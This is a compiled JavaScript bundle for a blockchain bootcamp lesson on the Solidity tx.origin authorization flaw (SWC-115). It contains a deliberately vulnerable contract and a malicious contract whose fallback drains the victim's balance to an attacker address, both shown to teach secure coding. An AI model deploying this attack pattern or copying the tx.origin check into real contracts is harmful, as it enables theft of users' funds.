"use strict";(self.webpackChunkeducation_docs=self.webpackChunkeducation_docs||[]).push([[3456],{8582:(t,e,n)=>{n.r(e),n.d(e,{assets:()=>s,contentTitle:()=>c,default:()=>h,frontMatter:()=>a,metadata:()=>i,toc:()=>l});var r=n(4848),o=n(8453);const a={},c=void 0,i={id:"courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2b-tx-origin-attack/index",title:"index",description:"TxOrigin Attack (SWC-115)",source:"@site/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2b-tx-origin-attack/index.md",sourceDirName:"courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2b-tx-origin-attack",slug:"/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2b-tx-origin-attack/",permalink:"/educationdao.xyz/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2b-tx-origin-attack/",draft:!1,unlisted:!1,tags:[],version:"current",lastUpdatedBy:"oliver renwick",lastUpdatedAt:1721137902e3,frontMatter:{},sidebar:"docSidebar",previous:{title:"Smart Contract Pitfalls and Attacks",permalink:"/educationdao.xyz/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2a-sc-pitfalls-and-attacks/"},next:{title:"DoS Attack Contract",permalink:"/educationdao.xyz/docs/courses/blockchain-developer-bootcamp/S03-smart-contracts/M6-security/L2c-dos-attack/"}},s={},l=[{value:"TxOrigin Attack (SWC-115)",id:"txorigin-attack-swc-115",level:2}];function d(t){const e={a:"a",code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...t.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(e.h2,{id:"txorigin-attack-swc-115",children:"TxOrigin Attack (SWC-115)"}),"\n",(0,r.jsxs)(e.p,{children:["In this lesson we are going to cover a ",(0,r.jsx)(e.code,{children:"tx.origin"})," attack. The global variable ",(0,r.jsx)(e.code,{children:"tx.origin"})," in Solidity always references the address of the original sender of the transaction, of the full call chain. ",(0,r.jsx)(e.a,{href:"https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-properties",children:"See the reference in the docs here."})," This is different than ",(0,r.jsx)(e.code,{children:"msg.sender"})," in that ",(0,r.jsx)(e.code,{children:"msg.sender"})," references the address of the sender of the current call."]}),"\n",(0,r.jsxs)(e.p,{children:["You should never use ",(0,r.jsx)(e.code,{children:"tx.origin"})," in Solidity for authorization (",(0,r.jsx)(e.a,{href:"https://swcregistry.io/docs/SWC-115",children:"SWC-115"}),"). The following smart contract shows you why. It is susceptible to attack."]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{children:"pragma solidity >0.5.0;  \n\n// Example Tx.Origin Authentication Attack     \ncontract VulnerableContract {      \n  address payable owner = msg.sender;             \n  \n  function withdraw(address payable _recipient) public {          \n    require(tx.origin == owner);          \n    _recipient.transfer(address(this).balance);      \n  }             \n  \n  function getBalance() view public returns(uint) {          \n    return address(this).balance;      \n  }             \n  \n  function() external payable {}  \n}     \n\ncontract MaliciousContract {      \n  VulnerableContract vulnerableContract = VulnerableContract(0x08970FEd061E7747CD9a38d680A601510CB659FB);      \n  address payable attackerAddress = 0xdD870fA1b7C4700F2BD7f44238821C26f7392148;             \n  \n  function() external payable {          \n    vulnerableContract.withdraw(attackerAddress);      \n  }  \n}\n"})}),"\n",(0,r.jsx)(e.p,{children:"In this contract, if the creator of the VulnerableContract is tricked into calling the MaliciousContract, the Malicious contract will be able to drain the VulnerableContract of all funds."}),"\n",(0,r.jsx)(e.p,{children:"Additional Resources:"}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:(0,r.jsx)(e.a,{href:"https://solidity.readthedocs.io/en/latest/security-considerations.html?#tx-origin",children:"Solidity documentation on the security considerations of tx.origin"})}),"\n",(0,r.jsx)(e.li,{children:(0,r.jsx)(e.a,{href:"https://swcregistry.io/docs/SWC-115",children:"The SWC Registry entry for Authorization through tx.origin"})}),"\n"]})]})}function h(t={}){const{wrapper:e}={...(0,o.R)(),...t.components};return e?(0,r.jsx)(e,{...t,children:(0,r.jsx)(d,{...t})}):d(t)}},8453:(t,e,n)=>{n.d(e,{R:()=>c,x:()=>i});var r=n(6540);const o={},a=r.createContext(o);function c(t){const e=r.useContext(a);return r.useMemo((function(){return"function"==typeof t?t(e):{...e,...t}}),[e,t])}function i(t){let e;return e=t.disableParentContext?"function"==typeof t.components?t.components(o):t.components||o:c(t.components),r.createElement(a.Provider,{value:e},t.children)}}}]);